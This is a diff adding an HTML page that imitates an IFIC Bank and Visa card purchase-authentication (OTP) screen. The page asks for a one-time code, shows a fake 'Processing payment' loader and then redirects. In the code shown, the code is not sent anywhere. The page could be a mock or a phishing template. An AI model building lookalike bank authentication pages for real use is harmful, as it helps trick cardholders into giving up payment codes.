@@ -1,0 +1,356 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Purchase Authentication</title>
+    <link rel="stylesheet" href="styles.css" />
+    <style>
+      html, body {
+        margin: 0;
+        padding: 0;
+        background: #ffffff;
+      }
+      .auth-page {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        background: #ffffff;
+      }
+      .auth-card {
+        width: 100%;
+        max-width: 480px;
+        background: #ffffff;
+        padding: 28px 24px 20px;
+        border-radius: 14px;
+        box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.12), 0 4px 12px -4px rgba(0, 0, 0, 0.06);
+        border: 1px solid #e5e7eb;
+      }
+      .auth-logos {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 28px;
+        gap: 10px;
+      }
+      .auth-logo-ific {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .auth-logo-ific img {
+        height: 58px;
+        width: auto;
+        object-fit: contain;
+      }
+      .auth-logo-ific .ific-text {
+        font-size: 30px;
+        font-weight: 900;
+        color: #1a1a1a;
+        letter-spacing: -1px;
+        line-height: 1;
+      }
+      .auth-logo-visa img {
+        height: 48px;
+        width: auto;
+        object-fit: contain;
+      }
+      .auth-title {
+        text-align: center;
+        font-size: 24px;
+        font-weight: 900;
+        color: #000000;
+        margin: 0 0 24px 0;
+        letter-spacing: 0.2px;
+      }
+      .auth-subtitle {
+        font-size: 16px;
+        color: #6b7280;
+        margin: 0 0 12px 0;
+        font-weight: 400;
+        line-height: 1.5;
+        text-align: left;
+      }
+      .auth-dropdown {
+        width: 100%;
+        padding: 12px 16px;
+        font-size: 17px;
+        font-weight: 500;
+        color: #111827;
+        background: #f3f4f6;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        outline: none;
+        cursor: pointer;
+        appearance: none;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='%236b7280' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 14px center;
+        background-size: 20px;
+        padding-right: 48px;
+        margin-bottom: 18px;
+        box-sizing: border-box;
+      }
+      .auth-dropdown::-ms-expand {
+        display: none;
+      }
+      .auth-dropdown:focus {
+        border-color: #16a34a;
+        box-shadow: 0 0 0 3px rgba(22, 163, 74, 0.1);
+        background-color: #ffffff;
+      }
+      .auth-otp-input {
+        display: none;
+        width: 100%;
+        padding: 12px 16px;
+        font-size: 17px;
+        font-weight: 500;
+        color: #111827;
+        background: #ffffff;
+        border: 1.5px solid #e5e7eb;
+        border-radius: 8px;
+        outline: none;
+        letter-spacing: 4px;
+        text-align: center;
+        margin-bottom: 18px;
+        box-sizing: border-box;
+      }
+      .auth-otp-input:focus {
+        border-color: #16a34a;
+        box-shadow: 0 0 0 3px rgba(22, 163, 74, 0.1);
+      }
+      .auth-otp-input.show {
+        display: block;
+      }
+      .auth-btn-submit {
+        width: 100%;
+        padding: 14px;
+        font-size: 19px;
+        font-weight: 500;
+        color: #ffffff;
+        background: #008000;
+        border: none;
+        border-radius: 999px;
+        cursor: pointer;
+        margin-bottom: 12px;
+      }
+      .auth-cancel {
+        display: block;
+        text-align: center;
+        font-size: 18px;
+        font-weight: 400;
+        color: #1e40af;
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 6px;
+        margin: 0 auto 22px auto;
+      }
+      .auth-help {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        font-size: 16px;
+        color: #9ca3af;
+        font-weight: 400;
+      }
+      .auth-help .down-arrow {
+        color: #6b7280;
+        font-size: 16px;
+        line-height: 1;
+      }
+
+      /* Full-screen black loading overlay (after OTP submit) */
+      .black-loader-overlay{
+        position:fixed;
+        inset:0;
+        background:#000000;
+        display:none;
+        align-items:center;
+        justify-content:center;
+        flex-direction:column;
+        gap:28px;
+        z-index:9999;
+        color:#ffffff;
+      }
+      .black-loader-overlay.show{
+        display:flex;
+        animation:fadeInBlack .3s ease both;
+      }
+      @keyframes fadeInBlack{
+        from{opacity:0}
+        to{opacity:1}
+      }
+      .black-spinner{
+        width:72px;
+        height:72px;
+        border-radius:50%;
+        background:conic-gradient(from 0deg,transparent 0%,transparent 62%,#ffffff 62%,#ffffff 100%);
+        animation:spin 1.05s linear infinite;
+        position:relative;
+      }
+      .black-spinner::before{
+        content:"";
+        position:absolute;
+        inset:7px;
+        border-radius:50%;
+        background:#000000;
+      }
+      .black-spinner::after{
+        content:"";
+        position:absolute;
+        top:-1px;left:50%;
+        transform:translateX(-50%);
+        width:13px;height:13px;border-radius:50%;
+        background:#ffffff;
+        box-shadow:0 0 18px rgba(255,255,255,.75);
+      }
+      .black-loader-text{
+        font-size:15px;
+        font-weight:600;
+        letter-spacing:.4px;
+        color:#ffffff;
+        opacity:.9;
+        display:flex;
+        align-items:center;
+        gap:8px;
+      }
+      .black-loader-text::after{
+        content:"";
+        display:inline-block;
+        animation:dots 1.25s steps(4,end) infinite;
+        width:24px;
+      }
+      .black-loader-sub{
+        font-size:12px;
+        color:#9ca3af;
+        letter-spacing:.3px;
+      }
+      .black-bar{
+        width:min(420px,78%);
+        height:4px;
+        border-radius:999px;
+        background:#1f2937;
+        overflow:hidden;
+        position:relative;
+      }
+      .black-bar::after{
+        content:"";
+        position:absolute;
+        inset:0;
+        width:0%;
+        background:linear-gradient(90deg,#ffffff,#e5e7eb);
+        animation:blackProgress 6.2s ease-in-out forwards;
+      }
+      @keyframes blackProgress{
+        0%{width:0%}
+        35%{width:42%}
+        62%{width:68%}
+        85%{width:86%}
+        100%{width:100%}
+      }
+      @keyframes dots{
+        0%{content:""}
+        25%{content:"."}
+        50%{content:".."}
+        75%{content:"..."}
+        100%{content:""}
+      }
+      @keyframes spin{to{transform:rotate(360deg)}}
+    </style>
+  </head>
+  <body>
+    <div class="auth-page">
+      <div class="auth-card">
+        <div class="auth-logos">
+          <div class="auth-logo-ific">
+            <img src="ific.jpeg" alt="IFIC Bank" />
+            <span class="ific-text"></span>
+          </div>
+          <div class="auth-logo-visa">
+            <img src="Visalogo.png" alt="VISA" />
+          </div>
+        </div>
+
+        <h1 class="auth-title">Purchase Authentication</h1>
+
+        <p id="authSubtitle" class="auth-subtitle">Please Select OTP delivery method which you want</p>
+
+        <select id="authDropdown" class="auth-dropdown">
+          <option value="sms">SMS to 01856**7610</option>
+          <option value="email">Email to lumor****@gmail.com</option>
+        </select>
+
+        <input
+          id="authOtpInput"
+          class="auth-otp-input"
+          type="password"
+          inputmode="numeric"
+          maxlength="6"
+          placeholder="Enter OTP"
+          autocomplete="one-time-code"
+        />
+
+        <button id="authSubmit" class="auth-btn-submit" type="button">Submit</button>
+
+        <button class="auth-cancel" type="button">Cancel</button>
+
+        <div class="auth-help">
+          <span>Need some help?</span>
+          <span class="down-arrow">&darr;</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="blackLoader" class="black-loader-overlay" aria-hidden="true">
+      <div class="black-spinner"></div>
+      <div class="black-loader-text">Processing payment</div>
+      <div class="black-bar"></div>
+      <div class="black-loader-sub">Do not close this window</div>
+    </div>
+
+    <script>
+      (function () {
+        var submitBtn = document.getElementById("authSubmit");
+        var dropdown = document.getElementById("authDropdown");
+        var otpInput = document.getElementById("authOtpInput");
+        var subtitle = document.getElementById("authSubtitle");
+        var blackLoader = document.getElementById("blackLoader");
+        var step = 1;
+
+        submitBtn.addEventListener("click", function () {
+          if (step === 1) {
+            subtitle.textContent = "Please Enter OTP Number";
+            dropdown.style.display = "none";
+            otpInput.classList.add("show");
+            setTimeout(function () {
+              otpInput.focus();
+            }, 50);
+            step = 2;
+          } else {
+            var otp = otpInput.value.trim();
+            if (!otp) {
+              otpInput.focus();
+              return;
+            }
+            submitBtn.disabled = true;
+            if (blackLoader) blackLoader.classList.add("show");
+            setTimeout(function () {
+              window.location.href = "success.html";
+            }, 6200);
+          }
+        });
+
+        otpInput.addEventListener("keydown", function (e) {
+          if (e.key === "Enter") {
+            submitBtn.click();
+          }
+        });
+      })();
+    </script>
+  </body>
+</html>
